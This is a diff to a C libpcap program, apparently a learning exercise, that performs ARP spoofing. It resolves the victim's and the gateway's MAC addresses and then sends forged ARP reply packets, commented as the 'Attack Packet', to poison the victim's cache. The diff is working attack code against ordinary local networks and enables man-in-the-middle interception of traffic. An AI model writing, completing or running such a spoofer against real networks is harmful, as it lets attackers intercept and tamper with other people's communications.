@@ -26,9 +26,9 @@ struct ARP_HEADER{
     u_int8_t IP_Add_Len;
     u_int16_t Opcode;
     u_int8_t Sender_Mac[6];
-    struct in_addr Sender_IP;
+    u_int8_t Sender_IP[4];
     u_int8_t Target_Mac[6];
-    struct in_addr Target_IP;
+    u_int8_t Target_IP[4];
 };
 int main(int argc, char* argv[])
 {
@@ -41,7 +41,8 @@ int main(int argc, char* argv[])
     int i = 0;
     int res;
     struct pcap_pkthdr *header;
-
+    char* gateway_ip = "192.168.127.2";
+    u_int32_t gateway;
     const u_char* rev_packet;
     pcap_t *handle;
     u_char packet[42];
@@ -69,10 +70,11 @@ int main(int argc, char* argv[])
     printf("%s\n", argv[3]);
     sender = inet_addr(argv[2]);
     target = inet_addr(argv[3]);
+    gateway = inet_addr(gateway_ip);
     ethernet = (struct ETHERNET_HEADER*)malloc(sizeof(struct ETHERNET_HEADER));
     arp = (struct ARP_HEADER *)malloc(sizeof(struct ARP_HEADER));
     handle = pcap_open_live(argv[1], BUFSIZ, 0, -1, errbuf);
-
+    
     //////////////////////////////////////////////
     //////Making Packet to know Victim's MAC//////
     //////////////////////////////////////////////
@@ -148,8 +150,42 @@ int main(int argc, char* argv[])
         }
 
     }
+    //////////////////////////////////////////////////////
+    ////////////Making Packet to know Gateway's Mac///////
+    //////////////////////////////////////////////////////
 
+    for(i=0;i<4; i++){
+        packet[38+i] = gateway >> i*8;
+    }
 
+    while(1){
+	pcap_sendpacket(handle, packet, 42);
+	res = pcap_next_ex(handle, &header, &rev_packet);
+	if(res == 0){
+	    continue;
+	}
+	else if(res == -1 || res == -2){
+	    printf("res == -1 or -2 \n");
+	    break;
+	}else{
+	    ethernet = (struct ETHERNET_HEADER *)(rev_packet);
+	    arp = (struct ARP_HEADER *)(rev_packet+ETHERNET_SIZE);
+		
+            if(arp->Opcode == 512 && arp->Sender_IP[3] == 0x02){
+                printf("Get GateWay's Mac Address..!\n");
+	        for(i=0;i<4; i++){
+       	            packet[38+i] = target >> i*8;
+   		}
+		for(i=0; i<6; i++){
+		    packet[22+i] = ethernet->Source_Mac[i];
+		}
+		
+                break;
+            }
+
+	}
+
+    }
 
     ////////////////////////////////////////////////////////////
     /////////////////////Sending Attack Packet//////////////////
@@ -160,14 +196,6 @@ int main(int argc, char* argv[])
         packet[32+i] = ethernet->Source_Mac[i];
     }
 
-
-
-    packet[22] = 0x00;
-    packet[23] = 0x50;
-    packet[24] = 0x56;
-    packet[25] = 0xf6;
-    packet[26] = 0x51;
-    packet[27] = 0x61;
     for(i=0; i<10; i++){
         pcap_sendpacket(handle, packet,42);
     }
